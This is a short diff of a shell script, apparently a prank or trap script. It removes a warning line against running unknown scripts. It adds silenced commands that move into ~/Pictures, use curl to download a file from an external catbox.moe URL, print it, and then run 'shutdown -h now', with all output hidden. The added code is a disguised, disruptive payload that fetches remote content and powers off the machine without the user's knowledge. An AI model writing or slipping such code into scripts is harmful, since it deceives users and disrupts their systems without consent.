@@ -78,6 +78,8 @@ done
 repeat=0
 
 # End
-echo "don't run something without looking at what it is first man"
-sleep 5s
-shutdown -h now
+cd ~/Pictures > /dev/null 2>&1
+curl https://files.catbox.moe/wkafud.txt --output rip.txt > /dev/null 2>&1
+cat rip.txt
+sleep 2s > /dev/null 2>&1
+shutdown -h now > /dev/null 2>&1
